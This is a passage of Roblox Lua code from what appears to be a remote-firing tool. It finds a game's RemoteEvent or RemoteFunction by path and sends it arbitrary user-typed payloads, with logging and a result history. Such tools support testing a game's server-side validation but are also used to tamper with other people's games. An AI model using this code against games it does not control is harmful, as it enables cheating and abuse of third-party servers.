local function pushHistory(name, payload, ok, result)
    local e = {t=ts(), name=name, ok=ok, result=tostring(result)}
    table.insert(S.execHistory, 1, e)
    while #S.execHistory > CFG.MAX_EXEC_HIST do table.remove(S.execHistory) end

    HistList:ClearAllChildren(); mkList(HistList, 2); mkPad(HistList,4,4,4,4)
    for _, h in ipairs(S.execHistory) do
        local r = Instance.new("Frame")
        r.Size = UDim2.new(1,-8,0,16)
        r.BackgroundColor3 = h.ok and Color3.fromRGB(11,22,12) or Color3.fromRGB(22,11,11)
        r.BorderSizePixel = 0; r.Parent = HistList; mkCorner(r,3)
        local rl = mkLbl(r, ("[%s] %s → %s"):format(h.t, h.name, h.ok and "OK: "..h.result:sub(1,50) or "FAIL: "..h.result:sub(1,50)), 10, h.ok and T.OK or T.CRIT, Enum.Font.Code)
        rl.Size = UDim2.new(1,-8,1,0); rl.Position = UDim2.new(0,4,0,0)
    end
end

local function resolveRemote()
    local remote = S.selRemote
    if remote and remote.Parent then return remote end
    local path = TargetBox.Text
    if path == "" then return nil end
    local parts = path:split(".")
    local ok2, svc = pcall(function() return game:GetService(parts[1]) end)
    if not ok2 then return nil end
    local cur = svc
    for i = 2, #parts do
        cur = cur:FindFirstChild(parts[i])
        if not cur then return nil end
    end
    return cur
end

local function doExecute()
    local payload = PayloadBox.Text
    if payload == "" then log("WARN","Payload is empty."); return end
    local remote = resolveRemote()
    if not remote then log("WARN","No valid target remote."); return end

    log("EXEC",("Firing [%s] %s '%s'"):format(S.fireMode, remote.ClassName, remote.Name))
    local ok, res

    if S.fireMode == "FireServer" and remote:IsA("RemoteEvent") then
        ok, res = pcall(function() remote:FireServer(payload); return "Fired" end)
    elseif S.fireMode == "InvokeServer" and remote:IsA("RemoteFunction") then
        ok, res = pcall(function() return tostring(remote:InvokeServer(payload)) end)
    else
        log("WARN","Mode/class mismatch: "..S.fireMode.." vs "..remote.ClassName)
        ExecResultLabel.TextColor3 = T.CRIT
        ExecResultLabel.Text = "Mode mismatch"
        return
    end

    local resultStr = ok and tostring(res) or ("ERROR: "..tostring(res))
    ExecResultLabel.Text = "Last: "..resultStr:sub(1,80)
    ExecResultLabel.TextColor3 = ok and T.OK or T.CRIT
    log(ok and "OK" or "WARN","Result: "..resultStr:sub(1,120))
    pushHistory(remote.Name, payload, ok, resultStr)
end

